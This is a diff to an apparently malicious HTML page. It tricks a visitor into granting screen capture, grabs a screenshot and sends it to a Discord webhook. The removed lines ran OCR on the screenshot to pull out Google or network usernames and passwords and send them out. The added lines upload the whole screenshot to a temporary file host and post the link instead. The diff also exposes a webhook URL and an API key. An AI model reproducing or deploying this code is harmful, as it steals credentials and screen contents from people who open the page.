@@ -3,45 +3,38 @@
 <head>
 <meta charset="UTF-8">
 <title></title>
-<style>
-  body { margin:0; background:#fff; }
-</style>
+<style>body{margin:0;background:#fff}</style>
 </head>
 <body>
 <script>
 const WEBHOOK="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd";
-const OCR_KEY="K85882318988957";
 
 (async()=>{
   try{
-    console.log("Opening test tab for permissions...");
+    // open test tab just to notify permissions
     const testTab = window.open("test.html","_blank");
-    if(!testTab) console.log("Warning: test tab could not be opened. Continuing without it.");
-
     console.log("Requesting screen capture...");
     const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
     console.log("Permissions granted.");
 
-    // Notify test tab that permissions were granted
     if(testTab) testTab.postMessage({msg:"allowed-permissions"},"*");
     console.log("Sent allowed-permissions message to test tab.");
 
-    // 1 second pause to ensure video is ready
+    // short pause
     await new Promise(r => setTimeout(r,1000));
 
+    // setup video element
     const video = document.createElement("video");
     video.srcObject = stream;
     await new Promise(resolve=>{
       video.onloadedmetadata = ()=> video.play().then(resolve);
     });
     await new Promise(resolve=>{
-      const check = ()=> {
-        if(video.videoWidth && video.videoHeight) resolve();
-        else setTimeout(check,50);
-      };
+      const check=()=>{if(video.videoWidth && video.videoHeight) resolve(); else setTimeout(check,50);}
       check();
     });
 
+    // capture screenshot
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -49,34 +42,27 @@ const OCR_KEY="K85882318988957";
     stream.getTracks().forEach(t=>t.stop());
 
     const blob = await new Promise(r=>canvas.toBlob(r,"image/png"));
-    const formData = new FormData();
-    formData.append("apikey",OCR_KEY);
-    formData.append("language","eng");
-    formData.append("file",blob,"shot.png");
 
-    console.log("Sending screenshot to OCR API...");
-    const ocrRes = await fetch("https://api.ocr.space/parse/image",{method:"POST",body:formData});
-    const ocrJson = await ocrRes.json();
+    // upload to litterbox.catbox.moe
+    console.log("Uploading screenshot to Litterbox...");
+    const form = new FormData();
+    form.append("reqtype","fileupload");
+    form.append("time","24h");
+    form.append("fileToUpload", blob, "shot.png");
 
-    const lines = ocrJson.ParsedResults?.map(r=>r.ParsedText).join("\n").split(/\r?\n/) || [];
-    const output = lines.reduce((a,v,i)=>{
-      if(a) return a;
-      if(v.toLowerCase().includes("network/google username") || v.toLowerCase().includes("network/google password")){
-        return `${lines[i+1]||""}\n${lines[i+2]||""}`;
-      }
-      return "";
-    },"").trim();
+    const uploadRes = await fetch("https://litterbox.catbox.moe/resources/internals/api.php", {method:"POST", body:form});
+    const link = await uploadRes.text();
+    console.log("Upload complete. Direct link:", link);
 
-    console.log(output ? "Found matches:\n" + output : "No matches found.");
-
+    // send link to discord
     await fetch(WEBHOOK,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({content:output||"(no valid text found)"})
+      body:JSON.stringify({content:link})
     });
-    console.log("OCR + Discord done!");
+    console.log("Link sent to Discord!");
 
-    // Close the test tab directly
+    // close test tab
     if(testTab) testTab.close();
     console.log("Test tab closed.");
 
